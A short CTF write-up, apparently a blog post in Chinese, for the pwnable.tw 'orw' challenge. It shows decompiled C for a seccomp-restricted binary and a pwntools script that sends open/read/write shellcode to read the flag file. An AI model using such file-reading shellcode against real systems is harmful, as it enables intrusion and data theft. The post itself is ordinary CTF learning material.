---
title: pwnable.tw::orw
date: 2021-10-17 21:29:57
tags: pwn
---

## 保護機制
Canary, Partial RELRO

## 分析
### main
<!-- more -->
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```
### orw_seccomp
```c
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h]
  char *v2; // [esp+8h] [ebp-80h]
  char v3; // [esp+Ch] [ebp-7Ch]
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(&v3, &unk_8048640, 0x60u);
  v1 = 12;
  v2 = &v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```
在C語言有一種”SandBox模式”, 限制程式只能使用 `open()`, `read()`, `write()`

可以通過`seccomp()` 或是`prctl()`開啟

所以這裡的邏輯不重要, 只要知道只能 open, read, write就好

也不用繞canary, 因為沒有Control PC

## exploit
```python
#!/usr/bin/env python2 

from pwn import *
import pwnlib.shellcraft

p = remote('chall.pwnable.tw', 10001)

context.log_level = 'debug'

shellcode = shellcraft.i386.pushstr('/home/orw/flag')
shellcode += shellcraft.i386.linux.syscall('SYS_open', 'esp')
shellcode += shellcraft.i386.linux.syscall('SYS_read', 'eax', 'esp', 0x50)
shellcode += shellcraft.i386.linux.syscall('SYS_write', 1, 'esp', 0x50)

p.sendlineafter('Give my your shellcode:', asm(shellcode))

print p.recv()

p.close()
```

